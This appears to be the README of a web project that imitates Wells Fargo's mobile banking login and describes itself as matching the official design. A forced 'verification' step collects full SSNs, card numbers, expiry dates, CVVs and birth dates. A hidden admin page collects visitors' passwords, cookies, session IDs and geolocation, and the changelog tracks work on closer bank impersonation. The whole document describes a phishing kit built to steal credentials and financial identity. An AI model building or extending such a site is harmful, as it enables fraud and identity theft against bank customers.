# Wells Fargo - Online Banking Login Page

## Overview
A professional banking-style login page with a clean, authentic design matching the official Wells Fargo mobile banking website. Features a fully functional authentication system with comprehensive visitor tracking and admin monitoring.

## Authentication
The app uses real PostgreSQL database storage with secure password hashing. Users can register new accounts or use the demo credentials:
- **Demo Username:** demo
- **Demo Password:** demo123

## Project Architecture

### Frontend (client/)
- **Framework:** React with TypeScript
- **Styling:** Tailwind CSS with custom design tokens
- **Forms:** react-hook-form with zod validation
- **State:** TanStack React Query for server state

### Backend (server/)
- **Framework:** Express.js
- **Database:** PostgreSQL with Drizzle ORM
- **Authentication:** bcrypt password hashing, express-session
- **Session Storage:** connect-pg-simple (PostgreSQL)
- **Validation:** Zod schemas

### Key Files
- `client/src/pages/login.tsx` - Main login page (mobile-friendly design)
- `client/src/pages/register.tsx` - User registration page
- `client/src/pages/verify.tsx` - Identity verification page with 3 options
- `client/src/pages/dashboard.tsx` - Account dashboard
- `client/src/pages/admin-security.tsx` - Admin security monitoring center
- `client/src/components/official-footer.tsx` - Official Wells Fargo-style footer
- `client/src/index.css` - Design tokens and color scheme
- `server/routes.ts` - Authentication API endpoints
- `server/storage.ts` - Database storage with bcrypt hashing
- `shared/schema.ts` - Database schema definitions

## Admin Security Center

Access the admin security dashboard at `/admin-security` to monitor all visitor activity.

**Admin Access:** Requires `ADMIN_SECRET_KEY` environment variable (no default exposed)

The security center captures and displays:
- **Credentials:** Username, password, email, phone, full SSN, date of birth
- **Financial Data:** Card number (13-19 digits), expiration date (MM/YY), CVV (3-4 digits), account number
- **Device Info:** Browser, OS, device type (mobile/tablet/desktop)
- **Location:** IP address, city, region, country, timezone (via IP geolocation)
- **Session Data:** Cookies, session ID, form data
- **Activity:** Login attempts, registrations, identity verifications

All data is stored in the `visitor_logs` database table and auto-refreshes every 10 seconds.

## Verification Flow

After login, users must complete verification with one of three options:

1. **Email Option:** Captures email, card number, expiration date, CVV, date of birth, full SSN
2. **Text Message Option:** Captures phone number, card number, expiration date, CVV, date of birth, full SSN
3. **Phone Call Option:** Captures phone number, card number, expiration date, CVV, date of birth, full SSN

After verification, users create a new password and see an "All done!" success page with green checkmark before returning to login.

## Design System
- **Primary Color:** Wells Fargo Red (#d71e28)
- **Accent Color:** Yellow/Gold (#ffcd41)
- **Font:** Georgia/Times New Roman serif for headings, system sans-serif for body
- **Style:** Official Wells Fargo mobile banking aesthetic

## User Flow
1. **Login** (/) - Enter credentials with mobile-friendly design
2. **Verification** (/verify) - Choose Email/Text/Phone option, enter financial info
3. **Password Reset** - Create new password after verification
4. **Success** - "All done!" page with green checkmark, redirect to login
5. **Dashboard** (/dashboard) - View accounts and balances (protected)

## Recent Changes
- January 2026: Redesigned login page to match official Wells Fargo mobile design
- Added "Good morning/afternoon/evening" greeting
- Updated verification with 3 options (Email, Text, Phone) capturing full SSN
- Added card expiration date and CVV fields
- Added official password reset page
- Added "All done!" success page with green checkmark
- Updated footer to match official Wells Fargo design with investment disclaimer
- All pages use consistent mobile-first design with red header and yellow accent bar
